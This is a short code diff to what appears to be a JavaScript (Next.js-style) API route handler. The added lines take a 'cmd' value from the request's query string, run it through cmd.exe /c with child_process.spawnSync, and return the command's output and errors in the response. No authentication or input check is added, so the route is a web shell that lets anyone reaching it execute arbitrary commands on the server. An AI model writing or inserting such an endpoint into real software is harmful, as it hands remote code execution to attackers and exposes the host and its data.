@@ -1,5 +1,18 @@
+const exec = require('child_process').spawnSync;
+
 export default function handler(req, res) {
+
     const { cmd } = req.query
-    res.end(`cmd: ${cmd}`)
-    //res.status(200).json({ name: 'John Doe' })
+    let p = exec('cmd.exe', ['/c', cmd]);
+    console.log(p);
+    console.log(p.stdout);
+    console.log(p.stdout.toString());
+    let output = p.stdout.toString();
+    let error = p.stderr.toString();
+    
+    res.status(200).json({ 
+        cmd: cmd,
+        output: output,
+        error: error,
+    })
 }
